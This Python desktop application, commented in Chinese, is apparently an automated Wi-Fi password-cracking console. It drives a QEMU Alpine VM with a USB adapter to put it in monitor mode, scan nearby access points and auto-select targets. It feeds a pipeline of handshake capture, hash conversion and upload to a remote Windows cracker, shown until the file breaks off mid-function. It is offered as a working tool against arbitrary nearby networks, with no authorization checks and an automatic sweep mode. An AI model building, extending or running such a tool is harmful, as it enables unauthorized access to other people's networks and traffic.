#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
mac_wifi_app_v2.py — 一選就跑
================================
選一台 Wi-Fi → 自動循環：抓包 → 轉 hash → 送 Windows → 即時顯示破解狀態
出密碼就停；沒出就一直換角度抓、重送，直到你按「停止」。

底層沿用 mac_capture_app：QEMU Alpine + DWA-160 USB + hcxdumptool + hcxpcapngtool
"""
import tkinter as tk
from tkinter import ttk
import subprocess, threading, time, json, re, os, glob, urllib.request, signal, queue, shlex

# ---------------- fixed paths (Mac side) ----------------
QEMU_BIN = '/opt/homebrew/bin/qemu-system-aarch64'
_HOMEV = os.path.expanduser('~/vmbuild')
def _pick(*cands):
    for p in cands:
        if os.path.exists(p):
            return p
    return cands[0]
QCOW2   = _pick(_HOMEV + '/alpine-root.qcow2', '/tmp/alpine-root.qcow2')
KERNEL  = _pick('/tmp/alpine-boot/boot/vmlinuz-lts', _HOMEV + '/alpine-boot/boot/vmlinuz-lts')
INITRD  = _pick(_HOMEV + '/vmbuild/runner-initrd', '/tmp/vmbuild/runner-initrd',
                '/tmp/initramfs-custom', _HOMEV + '/initramfs-custom')
RUNNER_MODE = 'runner' in os.path.basename(INITRD)
CH = 'chroot /newroot ' if RUNNER_MODE else ''
SERIAL_LOG = '/tmp/vm_app_serial.log'
MON_SOCK   = '/tmp/vm_app_monitor.sock'
SSH_KEY    = os.path.expanduser('~/.ssh/vm_tongbao')
VM_SSH = ('ssh -i %s -p 2222 -o ConnectTimeout=20 -o StrictHostKeyChecking=no '
          '-o BatchMode=yes root@127.0.0.1' % SSH_KEY)
BIND = ('mount --bind /proc /newroot/proc 2>/dev/null; '
        'mount --bind /sys /newroot/sys 2>/dev/null; '
        'mount --bind /dev /newroot/dev 2>/dev/null\n') if RUNNER_MODE else ''

LOCAL_DIR = os.path.expanduser('~/MacCapture/captures')
CAPSTORE  = os.path.expanduser('~/wifi_cracker/capstore')
HASHSTORE = os.path.expanduser('~/wifi_cracker/hashstore')
APS_SEEN  = os.path.expanduser('~/wifi_cracker/aps_seen.json')
REACH_SEEN = os.path.expanduser('~/wifi_cracker/reach_seen.json')
TS_IP     = '100.94.10.122'  # Windows cracker on Tailscale (外出備援)
WEB_PORT  = 8765             # Mac 遠端儀表板 (手機/任何裝置可看)
UQUEUE    = os.path.expanduser('~/wifi_cracker/upload_queue.json')
APP_LOCK  = '/tmp/mac_wifi_app.lock'
DEFAULT_WIP, DEFAULT_PORT, DEFAULT_DUR = '100.94.10.122', '8766', '45'

# ---------------- dark theme ----------------
C_BG      = '#12151c'   # window
C_PANEL   = '#1a1e28'   # panels
C_CARD    = '#20263a'   # cards / tree rows
C_CARD_HI = '#2c3454'   # selected row
C_TEXT    = '#e8ecf4'
C_DIM     = '#8b93a7'
C_ACC     = '#3b82f6'   # blue
C_GREEN   = '#22c55e'
C_RED     = '#ef4444'
C_AMBER   = '#f59e0b'
FONT      = ('PingFang SC', 12)
FONT_B    = ('PingFang SC', 12, 'bold')
FONT_H    = ('PingFang SC', 18, 'bold')
FONT_MONO = ('PingFang SC', 11)
FONT_PASS = ('Menlo', 20, 'bold')

class App:
    def __init__(self, root):
        self.root = root
        root.title('WiFi 破解台  ·  選一台 → 自動跑')
        root.geometry('1280x740+30+30')
        root.minsize(1000, 620)
        root.configure(bg=C_BG)

        self.var = {
            'wip':  tk.StringVar(value=DEFAULT_WIP),
            'port': tk.StringVar(value=DEFAULT_PORT),
            'dur':  tk.StringVar(value=DEFAULT_DUR),
        }
        self._stop  = threading.Event()
        self._running = threading.Event()
        self.aps = []          # [(ssid, bssid, ch, sig)]
        self.target = None     # (ssid, bssid, ch)
        self._cap_lock = threading.Lock()
        self.aps_seen = {}  # bssid -> [ssid, ch, best_sig, last_ts]
        try:
            with open(APS_SEEN) as f:
                d = json.load(f)
            if isinstance(d, dict):
                self.aps_seen.update(d)
        except Exception:
            pass
        self.reach_seen = {}
        try:
            with open(REACH_SEEN) as f:
                d = json.load(f)
            if isinstance(d, dict):
                self.reach_seen.update(d)
        except Exception:
            pass
        self.hash_pool = set() # hashes for current target
        self._tgt_cancel = threading.Event()
        self.phase = ('idle', '等待選定 Wi-Fi')
        self._boot_lock = threading.Lock()

        self._build()
        self._q = queue.Queue()
        self.root.after(40, self._drain)
        self.root.after(5000, self._selfcheck_tick)
        if os.environ.get('MACAPP_UI_ONLY'):
            self._log('UI-only 模式（除錯）')
        else:
            threading.Thread(target=self._usb_vm_loop, daemon=True).start()
            threading.Thread(target=self._scan_loop, daemon=True).start()
            threading.Thread(target=self._sync_loop, daemon=True).start()
            threading.Thread(target=self._web_loop, daemon=True).start()
            threading.Thread(target=self._rca_loop, daemon=True).start()
            self._log('就緒。自動掃描中 — 在左邊選一台 Wi-Fi 就會自動開始。')
            threading.Thread(target=self._startup_vm, daemon=True).start()
        signal.signal(signal.SIGUSR1, self._lift)

        self.root.after(800, self._lift)


    def _ui_selfcheck(self):
        try:
            import time as _t
            from tkinter import font as tkfont
            _now = _t.time()
            if getattr(self, '_sc_last', 0) and _now - self._sc_last < 10:
                return
            self._sc_last = _now
            lines = []
            w = self.root.winfo_width(); h = self.root.winfo_height()
            mapped = self.root.state()
            lines.append("geom=%dx%d state=%s" % (w, h, mapped))
            for name, f in (("FONT", FONT), ("FONT_B", FONT_B), ("FONT_H", FONT_H)):
                try:
                    m = tkfont.Font(font=f).measure("WiFi破解台1234567890")
                    lines.append("%s_measure=%d" % (name, m))
                except Exception as e:
                    lines.append("%s_err=%s" % (name, e))
            try:
                n = len(self.tree.get_children())
                first = self.tree.item(self.tree.get_children()[0]) if n else {}
                lines.append("tree_items=%d first_ssid=%r" % (n, first.get('values', ('',))[0] if n else ''))
            except Exception as e:
                lines.append("tree_err=%s" % e)
            try:
                lines.append("target=%r phase=%r aps=%d" % (self.target, self.phase, len(self.aps)))
            except Exception:
                pass
            try:
                for k in ('scan', 'cap', 'conv', 'crack'):
                    lb = self.phases[k]
                    lines.append("ph_%s req=%d w=%d t=%r" % (
                        k, lb.winfo_reqwidth(), lb.winfo_width(),
                        lb.cget('text')))
                    sb = self.phases[k + '_sub']
                    lines.append("ps_%s req=%d w=%d t=%r" % (
                        k, sb.winfo_reqwidth(), sb.winfo_width(),
                        sb.cget('text')))
                lines.append("lbl_target req=%d w=%d t=%r" % (
                    self.lbl_target.winfo_reqwidth(),
                    self.lbl_target.winfo_width(),
                    self.lbl_target.cget('text')))
                lines.append("lbl_result req=%d w=%d t=%r" % (
                    self.lbl_result.winfo_reqwidth(),
                    self.lbl_result.winfo_width(),
                    self.lbl_result.cget('text')))
                lines.append("win=%dx%d tree_w=%d" % (
                    self.root.winfo_width(), self.root.winfo_height(),
                    self.tree.winfo_width()))
            except Exception:
                pass
            lines.append("t=%s" % _t.strftime("%H:%M:%S"))
            NL = chr(10)
            open("/tmp/mac_wifi_ui.txt", "w").write(NL.join(lines) + NL)
        except Exception:
            pass

    # ================= UI =================
    def _build(self):
        top = ttk.Frame(self.root)
        st = ttk.Style()
        st.theme_use('clam')
        st.configure('.', background=C_BG)
        top.pack(fill='x', padx=14, pady=(12, 6))
        ttk.Label(top, text='WiFi 破解台', font=FONT_H, foreground=C_TEXT,
                  background=C_BG).pack(side='left')
        # status cards: USB 網卡 + VM 介面
        self.card_usb = tk.Label(top, text='🔌 抓包網卡：檢查中…', font=FONT_B,
                                 bg='#1e2534', fg=C_DIM, padx=14, pady=6,
                                 anchor='w', relief='flat')
        self.card_usb.pack(side='left', padx=(14, 4))
        self.card_vm = tk.Label(top, text='📶 掃描引擎：檢查中…', font=FONT_B,
                                bg='#1e2534', fg=C_DIM, padx=14, pady=6,
                                anchor='w', relief='flat')
        self.card_vm.pack(side='left', padx=4)
        self.card_net = tk.Label(top, text='☁ Windows：檢查中…', font=FONT_B,
                                 bg='#1e2534', fg=C_DIM, padx=14, pady=6,
                                 anchor='w', relief='flat')
        self.card_net.pack(side='left', padx=4)
        ttk.Label(top, text='Windows 電腦', font=FONT, foreground=C_DIM,
                  background=C_BG).pack(side='left')
        ttk.Entry(top, textvariable=self.var['wip'], width=14,
                  font=FONT_MONO).pack(side='left', padx=(6, 12))
        ttk.Label(top, text='連接埠', font=FONT, foreground=C_DIM,
                  background=C_BG).pack(side='left')
        ttk.Entry(top, textvariable=self.var['port'], width=6,
                  font=FONT_MONO).pack(side='left', padx=(6, 12))
        ttk.Label(top, text='抓包秒數', font=FONT, foreground=C_DIM,
                  background=C_BG).pack(side='left')
        ttk.Entry(top, textvariable=self.var['dur'], width=4,
                  font=FONT_MONO).pack(side='left', padx=(6, 12))
        self.btn_stop = tk.Button(top, text='■ 停止', command=self.stop_all,
                                  font=FONT_B, fg=C_TEXT, bg='#3a2530',
                                  activebackground='#553040', relief='flat',
                                  padx=14, pady=4)
        self.btn_stop.pack(side='left')

        body = ttk.Frame(self.root)
        body.pack(fill='both', expand=True, padx=14, pady=6)
        body.columnconfigure(0, weight=0, minsize=410)
        body.columnconfigure(1, weight=3, minsize=430)
        body.columnconfigure(2, weight=2, minsize=330)
        body.rowconfigure(0, weight=1)

        # ---- left: network list ----
        left = tk.Frame(body, bg=C_PANEL)
        left.grid(row=0, column=0, sticky='nsew', padx=(0, 10))
        lf = tk.Frame(left, bg=C_PANEL)
        lf.pack(fill='x', padx=10, pady=(10, 4))
        self.lbl_scan = tk.Label(lf, text='📡 掃描中…', bg=C_PANEL, fg=C_DIM,
                                 font=FONT_B)
        self.lbl_scan.pack(side='left')
        tk.Button(lf, text='重新掃描', command=self._scan_now, bg=C_CARD,
                  fg=C_TEXT, relief='flat', padx=10, font=FONT,
                  activebackground=C_CARD_HI).pack(side='right')
        self.tree = ttk.Treeview(left, columns=('ssid', 'ch', 'sig', 'stat'),
                                 show='headings', selectmode='browse')
        self.tree.heading('ssid', text='網路名稱')
        self.tree.heading('ch', text='頻道')
        self.tree.heading('sig', text='訊號')
        self.tree.heading('stat', text='狀態')
        self.tree.column('ssid', anchor='w', stretch=True)
        self.tree.column('ch', width=42, anchor='center', stretch=False)
        self.tree.column('sig', width=64, anchor='center', stretch=False)
        self.tree.column('stat', width=96, anchor='center', stretch=False)
        st.configure('Dark.Treeview', background=C_CARD, fieldbackground=C_CARD,
             foreground=C_TEXT, rowheight=30, font=FONT)
        st.configure('Dark.Treeview.Heading', background=C_PANEL,
                     foreground=C_DIM, font=FONT_B)
        st.map('Dark.Treeview',
               background=[('selected', C_CARD_HI)],
               foreground=[('selected', C_TEXT)])
        self.tree.configure(style='Dark.Treeview')
        self.tree.pack(fill='both', expand=True, padx=10, pady=(0, 10))
        self.tree.bind('<Button-1>', self._on_pick)
        self.tree.bind('<Double-1>', self._on_pick)
        self._hint = tk.Label(left, text='← 選一台自動開始（選定後掃描暫停）',
                              bg=C_PANEL, fg=C_DIM, font=FONT)
        self._hint.pack(pady=(0, 8))

        # ---- middle: status ----
        mid = tk.Frame(body, bg=C_PANEL)
        mid.grid(row=0, column=1, sticky='nsew')
        # target card
        tc = tk.Frame(mid, bg=C_CARD)
        tc.pack(fill='x', padx=10, pady=(10, 6), ipadx=14, ipady=12)
        self.lbl_target = tk.Label(tc, text='尚未選定', font=FONT_H,
                                   bg=C_CARD, fg=C_TEXT, wraplength=430)
        self.lbl_target.pack(anchor='w')
        self.lbl_target_sub = tk.Label(tc, text='—', font=FONT,
                                       bg=C_CARD, fg=C_DIM, wraplength=430)
        self.lbl_target_sub.pack(anchor='w', pady=(2, 0))
        tk.Button(tc, text='✖ 取消目標', command=self.target_cancel,
                  font=FONT, fg=C_TEXT, bg='#5a4210',
                  activebackground='#7a5a18', relief='flat',
                  padx=10, pady=2).pack(anchor='w', pady=(6, 0))
        # phase list
        self.phases = {}
        for key, name in [('scan', '1 · 選定'), ('cap', '2 · 抓包'),
                          ('conv', '3 · 轉換+上傳'),
                          ('crack', '4 · 破解中')]:
            row = tk.Frame(mid, bg=C_PANEL)
            row.pack(fill='x', padx=10, pady=2)
            self.phases[key] = tk.Label(row, text='○  ' + name, font=FONT_B,
                                        bg=C_PANEL, fg=C_DIM, anchor='w',
                                        wraplength=430)
            self.phases[key].pack(fill='x')
            self.phases[key + '_sub'] = tk.Label(mid, text='', font=FONT_MONO,
                                                 bg=C_PANEL, fg=C_DIM,
                                                 anchor='w', wraplength=430)
            self.phases[key + '_sub'].pack(fill='x', padx=24)
        # result card
        rc = tk.Frame(mid, bg=C_CARD)
        rc.pack(fill='x', padx=10, pady=8)
        self.lbl_result = tk.Label(rc, text='—', font=FONT_PASS, bg=C_CARD,
                                   fg=C_DIM, anchor='center', wraplength=430)
        self.lbl_result.pack(padx=14, ipadx=14, ipady=18)

        # ---- right: log ----
        right = tk.Frame(body, bg=C_PANEL)
        right.grid(row=0, column=2, sticky='nsew', padx=(10, 0))
        tk.Label(right, text='狀態流水', font=FONT_B, bg=C_PANEL,
                 fg=C_DIM).pack(anchor='w', padx=10, pady=(10, 2))
        self.log = tk.Text(right, bg='#101420', fg=C_TEXT, font=FONT_MONO,
                           relief='flat', state='disabled', wrap='word',
                           width=46, insertbackground=C_TEXT)
        self.log.pack(fill='both', expand=True, padx=10, pady=(0, 10),
                      ipadx=8, ipady=6)

    def _set_phases(self):
        order = ['scan', 'cap', 'conv', 'crack']
        cur = self.phase[0]
        for k in order:
            if k == 'idle':
                continue
            is_cur = (cur == k)
            if is_cur:
                txt, col = '●  ' + self.phase[1], C_ACC
            else:
                txt, col = '○  ' + self._phase_name(k), C_DIM
            self._ui(lambda: self._set_text(self.phases[k], txt, col))

    def _phase_name(self, k):
        return {'scan': '選定', 'cap': '抓包', 'conv': '轉換握手包 + 上傳',
                'crack': 'Windows 破解中'}.get(k, k)

    def set_phase(self, key, text, sub='', color=None):
        self.phase = (key, text)
        if hasattr(self, 'phases'):
            self._ui(lambda: self.phases.get(key, tk.Label()).config(fg=color or C_ACC))
        if sub:
            self._ui(lambda: self._set_text(self.phases[key + '_sub'], sub))
        self._log('[%s] %s' % (self._phase_name(key), sub or text))

    def _result(self, text, color):
        self._last_result = text
        self._ui(lambda: self._set_text(self.lbl_result, text, color))

    # ================= UI thread helpers =================
    def _lift(self, *_):

        def _do():

            try:

                self.root.geometry('1280x740+30+30')

                self.root.deiconify()

                self.root.attributes('-topmost', True)

                self.root.lift()

                self.root.focus_force()

                self.root.after(2000, lambda: self.root.attributes('-topmost', False))

            except Exception:

                pass

        self._ui(_do)



    def _set_text(self, w, text, color=None):

        try:

            if text == getattr(w, '_last_text', None):

                return

            w._last_text = text

            if color is not None:

                w.config(text=text, fg=color)

            else:

                w.config(text=text)

        except Exception:

            pass



    def _ui(self, fn):
        try:
            self._q.put(fn)
        except Exception:
            pass

    def _drain(self):
        try:
            for _ in range(60):
                try:
                    fn = self._q.get_nowait()
                except queue.Empty:
                    break
                try:
                    fn()
                except Exception:
                    pass
        except Exception:
            pass
        self.root.after(40, self._drain)

    def _ev(self, tag, msg=''):
        try:
            p = '/tmp/mac_wifi_events.log'
            try:
                if os.path.getsize(p) > 400 * 1024:
                    os.replace(p, p + '.1')
            except Exception:
                pass
            with open(p, 'a') as f:
                f.write('%s [%s] %s\n' % (
                    time.strftime('%m-%d %H:%M:%S'), tag, msg))
        except Exception:
            pass

    def _log(self, msg):
        try:
            self._ev('gui', msg)
        except Exception:
            pass
        def _do():
            try:
                self.log.config(state='normal')
                self.log.insert('end', time.strftime('%H:%M:%S ') + msg + '\n')
                try:
                    if int(self.log.index('end-1c').split('.')[0]) > 400:
                        self.log.delete('1.0', '100.0')
                except Exception:
                    pass
                self.log.see('end')
                self.log.config(state='disabled')
            except Exception as _e:
                try:
                    open('/tmp/mac_wifi_ui_err.txt', 'a').write(repr(_e) + NL)
                except Exception:
                    pass
            self._ui_selfcheck()
        self._ui(_do)

    def _selfcheck_tick(self):
        try:
            self._ui_selfcheck()
        except Exception:
            pass
        self.root.after(10000, self._selfcheck_tick)

    # ================= USB / VM =================
    def _usb_vm_loop(self):
        while not self._stop.is_set():
            usb = self._check_usb()
            vm = self.vm_ready(timeout=8) if usb else False
            wlan = self.wlan_ok() if vm else False
            if usb and wlan:
                tu, cu = '🔌 抓包網卡：✅ 已抓取', C_GREEN
                tv, cv = '📶 掃描引擎：✅ 就緒', C_GREEN
            elif vm:
                holder = self._usb_holder()
                if holder != getattr(self, '_last_holder', ''):
                    self._last_holder = holder
                    self._ev('usbdiag', 'holder=%r' % holder)
                if holder:
                    tu, cu = '🔌 抓包網卡：⚠️ 被 %s 佔用' % holder, C_RED
                else:
                    tu, cu = '🔌 抓包網卡：⚠️ 換個 USB 孔試試', C_AMBER
                tv, cv = '📶 掃描引擎：✅ 就緒', C_GREEN
            elif usb:
                tu, cu = '🔌 抓包網卡：✅ 已插入', C_GREEN
                tv, cv = '📶 掃描引擎：⏳ 啟動中…', C_AMBER
            else:
                tu, cu = '🔌 抓包網卡：❌ 未偵測到（請插入）', C_RED
                tv, cv = '📶 掃描引擎：—', C_DIM
            self._ui(lambda: self._set_text(self.card_usb, tu, cu))
            self._ui(lambda: self._set_text(self.card_vm, tv, cv))
            ok_ts = getattr(self, '_api_ok_ts', 0)
            if time.time() - ok_ts < 130:
                tn = '☁ Windows：✅ %s' % getattr(self, '_good_ep', '')
                cn = C_GREEN
            else:
                nq = len(self._load_queue())
                tn = ('☁ Windows：❌ 離線 · 補傳佇列 %d 台' % nq if nq
                      else '☁ Windows：❌ 離線')
                cn = C_AMBER if nq else C_RED
            self._ui(lambda: self._set_text(self.card_net, tn, cn))
            for _ in range(5):
                if self._stop.is_set():
                    return
                time.sleep(1)

    def _usb_holder(self):
        try:
            r = subprocess.run(['ioreg', '-r', '-c',
                                'AppleUSBHostDeviceUserClient'],
                               capture_output=True, timeout=30)
            for ln in (r.stdout or b'').decode('utf-8', 'replace').splitlines():
                m = re.search(r'-o (.+?)\s+<class AppleUSBHostDeviceUserClient',
                              ln)
                if m:
                    name = m.group(1).strip()
                    if 'qemu' not in name.lower():
                        return name
        except Exception:
            pass
        return ''

    def _check_usb(self):
        try:
            r = subprocess.run(['ioreg', '-r', '-c', 'IOUSBHostDevice'],
                               capture_output=True, timeout=30)
            out = (r.stdout or b'').decode('utf-8', 'replace')
            if ('idVendor" = 5263' in out) and ('idProduct" = 21874' in out):
                return True
        except Exception:
            pass
        try:
            r = subprocess.run(['system_profiler', 'SPUSBDataType'],
                               capture_output=True, timeout=30)
            out = (r.stdout or b'').decode('utf-8', 'replace').lower()
            return ('148f' in out) and ('5572' in out)
        except Exception:
            return False

    def vm_ready(self, timeout=25):
        try:
            r = subprocess.run(VM_SSH.split() + ['echo VMOK'],
                               capture_output=True, timeout=timeout)
            if b'VMOK' in (r.stdout or b''):
                self._vm_up_once = True
                return True
            return False
        except Exception:
            return False

    def wlan_ok(self):
        try:
            r = subprocess.run(
                VM_SSH.split() + [CH + '/usr/sbin/iw dev 2>/dev/null'],
                capture_output=True, timeout=20)
            return 'wlan0' in (r.stdout or b'').decode('utf-8', 'replace')
        except Exception:
            return False

    def hotadd_adapter(self):
        try:
            subprocess.run(
                ['sh', '-c',
                 'printf "device_del wifiBoot\\ndevice_del wifiA\\n" | '
                 'nc -U -w 3 ' + MON_SOCK +
                 '; sleep 1; printf "device_add usb-host,bus=xhci.0,'
                 'vendorid=0x148f,productid=0x5572,id=wifiA\\n" | '
                 'nc -U -w 3 ' + MON_SOCK],
                capture_output=True, timeout=20)
            time.sleep(4)
            ok = self.wlan_ok()
            self._ev('hotadd', 'wlan_ok=%s' % ok)
            return ok
        except Exception as e:
            self._ev('hotadd', 'err=%r' % e)
            return False

    def _usb_ctrl(self):
        try:
            with open(os.path.expanduser('~') +
                      '/wifi_cracker/usb_ctrl.txt') as f:
                v = f.read().strip()
                if v:
                    return v
        except Exception:
            pass
        return 'qemu-xhci'

    def _startup_vm(self):
        if self.vm_ready(timeout=10):
            self._log('✅ 虛擬機已就緒（沿用）')
            return
        if not self._boot_lock.acquire(blocking=False):
            return
        try:
            self._startup_vm_inner()
        finally:
            self._boot_lock.release()

    def _startup_vm_inner(self):
        self._log('⏳ 啟動虛擬機（抓包網卡）...')
        missing = [f for f in (QEMU_BIN, QCOW2, KERNEL, INITRD, SSH_KEY)
                   if not os.path.exists(f)]
        if missing:
            self._log('❌ 缺少: %s' % ', '.join(missing))
            return
        try:
            subprocess.run(['pkill', '-f', 'qemu-system-aarch64'])
        except Exception:
            pass
        time.sleep(2)
        os.system('rm -f %s %s' % (SERIAL_LOG, MON_SOCK))
        cmd = ('%s -machine virt -cpu cortex-a72 -m 1024 -smp 2 '
               '-drive file=%s,format=qcow2 '
               '-kernel %s -initrd %s -append "console=ttyAMA0 cfg80211.ieee80211_regdom=TW" '
               '-chardev file,id=s0,path=%s,append=on -serial chardev:s0 '
               '-netdev user,id=n0,hostfwd=tcp:127.0.0.1:2222-10.0.2.15:22 '
               '-device virtio-net-pci,netdev=n0 '
               '-device ' + self._usb_ctrl() + ',id=xhci '
               '-device usb-host,bus=xhci.0,vendorid=0x148f,productid=0x5572,id=wifiBoot '
               '-display none -monitor unix:%s,server,nowait'
               % (QEMU_BIN, QCOW2, KERNEL, INITRD, SERIAL_LOG, MON_SOCK))
        subprocess.Popen(cmd, shell=True, stdout=subprocess.DEVNULL,
                         stderr=subprocess.DEVNULL)
        for _ in range(50):
            if self._stop.is_set():
                return
            if self.vm_ready(timeout=8):
                self._log('✅ 虛擬機就緒')
                return
            time.sleep(3)
        self._log('⚠️ 虛擬機啟動逾時（之後每輪重試）')

    def _qemu_age(self):
        try:
            r = subprocess.run(['pgrep', '-f', 'qemu-system-aarch64'],
                               capture_output=True, timeout=10)
            pid = (r.stdout or b'').decode().split('\n')[0].strip()
            if not pid:
                return -1
            r2 = subprocess.run(['ps', '-o', 'etime=', '-p', pid],
                                capture_output=True, timeout=10)
            et = (r2.stdout or b'').decode().strip()
            secs = 0
            for p in et.split(':'):
                if p.strip().isdigit():
                    secs = secs * 60 + int(p)
            return secs
        except Exception:
            return -1

    def boot_vm_if_needed(self):
        if self.vm_ready(timeout=12):
            return True
        age = self._qemu_age()
        if age >= 0 and age < 180:
            self._log('虛擬機啟動中，等待...')
            for _ in range(30):
                if self._stop.is_set():
                    return False
                time.sleep(5)
                if self.vm_ready(timeout=8):
                    self._log('✅ 虛擬機就緒')
                    return True
            return False
        self._log('虛擬機不在 → 重啟 ...')
        self._startup_vm()
        return self.vm_ready(timeout=12)

    # ================= scan =================
    def _scan_loop(self):
        miss = 0
        while not self._stop.is_set():
            if (not self.target and not self._running.is_set()
                    and not getattr(self, '_sweep_on', False)
                    and getattr(self, '_vm_up_once', False)):
                self._sweep_on = True
                threading.Thread(target=self._sweep_loop, daemon=True).start()
            if self._running.is_set():
                time.sleep(3)
                continue
            if not self.vm_ready(timeout=8):
                age = self._qemu_age()
                if age >= 0 and age < 180:
                    time.sleep(10)
                    continue
                miss += 1
                if miss >= 3:
                    miss = 0
                    self._log('虛擬機失聯 → 自動重啟')
                    self._ev('heal', 'trigger=vm_lost x3')
                    self.boot_vm_if_needed()
                time.sleep(5)
                continue
            miss = 0
            if not self.wlan_ok():
                self._log('網卡不在虛擬機 → 嘗試熱掛接...')
                self._ev('heal', 'trigger=wlan_missing')
                if not self.hotadd_adapter():
                    nf = getattr(self, '_hotadd_fails', 0) + 1
                    self._hotadd_fails = nf
                    if nf >= 6:
                        self._hotadd_fails = 0
                        self._log('熱掛接屢敗 → 重啟虛擬機重抓網卡')
                        self._ev('heal', 'trigger=hotadd x6')
                        try:
                            subprocess.run(['pkill', '-f',
                                            'qemu-system-aarch64'])
                        except Exception:
                            pass
                        time.sleep(2)
                        self._startup_vm()
                        continue
                    self._ui(lambda: self._set_text(
                        self.lbl_scan, '⚠️ 請拔插 USB 網卡', C_AMBER))
                    time.sleep(10)
                    continue
                self._hotadd_fails = 0
            self._scan_now()
            if not self.aps:
                zero = getattr(self, '_zero_scans', 0) + 1
                self._zero_scans = zero
                if zero >= 3:
                    self._zero_scans = 0
                    self._log('連續掃不到訊號 → 重建抓包環境')
                    self._ev('heal', 'trigger=zero_scans x3')
                    try:
                        subprocess.run(['pkill', '-f', 'qemu-system-aarch64'])
                    except Exception:
                        pass
                    time.sleep(2)
                    self._startup_vm()
            else:
                self._zero_scans = 0
            for _ in range(2):
                if self._stop.is_set():
                    return
                time.sleep(1)

    def _scan_now(self):
        if not self.vm_ready(timeout=8):
            self._ui(lambda: self._set_text(self.lbl_scan, '⏳ 虛擬機未就緒', C_AMBER))
            return
        script = (BIND +
                  CH + 'ifconfig wlan0 down 2>/dev/null\n' +
                  CH + 'iw dev wlan0 set type monitor 2>/dev/null\n' +
                  CH + 'ifconfig wlan0 up 2>/dev/null\n' +
                  CH + 'iw reg set TW 2>/dev/null\nsleep 1\n' +
                  'for ch in 1 2 3 4 5 6 7 8 9 10 11 12 13 14 '
                  '36 40 44 48 149 153 157 161; do\n' +
                  CH + '  /usr/sbin/iw dev wlan0 set channel $ch 2>/dev/null\n' +
                  '  echo "MARK:$ch"\n' +
                  CH + '  timeout 2.5 /usr/bin/tcpdump -i wlan0 -e -n '
                  '2>/dev/null\n' +
                  'done\ndone\n')
        try:
            with self._cap_lock:
                r = subprocess.run(VM_SSH.split() + ['sh', '-s'], input=script.encode(),
                                   capture_output=True, timeout=240)
            out = (r.stdout or b'').decode('utf-8', 'replace')
            aps = self._parse_scan(out)
            now = time.time()
            pool = getattr(self, '_ap_pool', {})
            for t in aps:
                pool[t[1]] = (t, now)
            self._ap_pool = pool
            aps = [pool[b][0] for b in pool if now - pool[b][1] < 120]
            with open('/tmp/mac_wifi_scan.txt', 'w') as f:
                f.write(time.strftime('%H:%M:%S') + ' APs=' + str(len(aps)) + '\n')
                for a in aps[:20]:
                    f.write('  ' + str(a[0]) + ' ' + str(a[1]) + ' ch' + str(a[2]) + ' ' + str(a[3]) + '\n')
            self.aps = aps
            _now = time.time()
            for (ssid, b, ch, g) in aps:
                bl = b.lower()
                try:
                    gv = int(g)
                except (TypeError, ValueError):
                    gv = None
                old = self.aps_seen.get(bl)
                if old is None:
                    self.aps_seen[bl] = [ssid, ch, gv, _now]
                else:
                    old[3] = _now
                    if gv is not None and (old[2] is None or gv > old[2]):
                        old[2] = gv
                    if ssid and ssid != '(hidden)':
                        old[0] = ssid
            for k in [k for k, v in self.aps_seen.items() if _now - v[3] > 3600]:
                self.aps_seen.pop(k, None)
            try:
                with open(APS_SEEN, 'w') as f:
                    json.dump(self.aps_seen, f)
            except Exception:
                pass
            if not self.target and not self._running.is_set():
                try:
                    at = open('/tmp/mac_wifi_autotarget').read().strip()
                except Exception:
                    at = ''
                if at:
                    ckd = self._known()[0]
                    for t in aps:
                        if ckd.get(t[0]):
                            continue
                        if t[1] == at or t[0] == at or at.lower() in t[0].lower():
                            self.target = (t[0], t[1], t[2])
                            self._tgt_miss = 0
                            self._log('🎯 自動選定(測試): %s' % t[0])
                            threading.Thread(
                                target=self._auto_loop,
                                args=(t[0], t[1], t[2]),
                                daemon=True).start()
                            break
            if (not self.target and not self._running.is_set()
                    and not getattr(self, '_sweep_on', False)):
                self._sweep_on = True
                threading.Thread(target=self._sweep_loop, daemon=True).start()
            self._refresh_tree()
            self._ui(lambda: self.lbl_scan.config(
                text='📡 %s · %d AP' % (time.strftime('%H:%M:%S'), len(aps)),
                fg=C_GREEN if aps else C_AMBER))
        except Exception as e:
            self._log('掃描異常: %r' % e)
            fails = getattr(self, '_fail_scans', 0) + 1
            self._fail_scans = fails
            if fails >= 3:
                self._fail_scans = 0
                self._log('掃描連續失敗 → 重建抓包環境')
                try:
                    subprocess.run(['pkill', '-f', 'qemu-system-aarch64'])
                except Exception:
                    pass
                time.sleep(2)
                self._startup_vm()
            self._ui(lambda: self._set_text(self.lbl_scan, '⚠️ 掃描失敗', C_RED))

    @staticmethod
    def _parse_scan(out):
        aps = {}
        order = []
        ch = 0
        for raw in out.splitlines():
            ls = raw.strip()
            mk = re.match(r'MARK:(\d+)', ls)
            if mk:
                ch = int(mk.group(1))
                continue
            if 'DA:ff:ff:ff:ff:ff:ff' not in ls or 'Beacon (' not in ls:
                continue
            mb = re.search(r'BSSID:([0-9a-f]{2}(?::[0-9a-f]{2}){5})', ls)
            if not mb:
                continue
            bssid = mb.group(1).replace(':', '').lower()
            ms = re.search(r'Beacon \(([^)]*)\)', ls)
            ssid = ms.group(1).strip() if ms else ''
            mv = re.search(r'(-?\d+)dBm', ls)
            v = int(mv.group(1)) if mv else None
            if bssid not in aps:
                aps[bssid] = {'ssid': ssid, 'ch': ch, 'sig': v}
                order.append(bssid)
            else:
                if ssid and not aps[bssid]['ssid']:
                    aps[bssid]['ssid'] = ssid
                if v is not None and (aps[bssid]['sig'] is None
                                      or v > aps[bssid]['sig']):
                    aps[bssid]['sig'] = v
        res = []
        for b in order:
            a = aps[b]
            v = a.get('sig')
            if v is None:
                sigtxt = '?'
            else:
                sigtxt = str(v) if v is not None else '?'
            res.append((a['ssid'] or '(hidden)', b.upper(), str(a['ch']), sigtxt))
        try:
            res.sort(key=lambda x: int(x[2]) if x[2].isdigit() else 99)
        except Exception:
            pass
        return res


    def _known(self):
        import time as _t
        now = _t.time()
        if getattr(self, '_known_cache', None) and now - self._known_cache[0] < 60:
            return self._known_cache[1]
        data = ({}, set())
        try:
            wip = self.var['wip'].get().strip()
            port = self.var['port'].get().strip()
            body = self._api_try(wip, port, '/api/known', timeout=6)[0]
            d = json.loads(body)
            ck = d.get('cracked') or {}
            if not isinstance(ck, dict):
                ck = {s: '' for s in ck}
            data = (ck, set(d.get('captured') or []))
        except Exception:
            data = getattr(self, '_known_cache', (None, ({}, set())))[1]
        try:
            with open(os.path.expanduser('~/wifi_cracker/local_pot')) as f:
                for line in f:
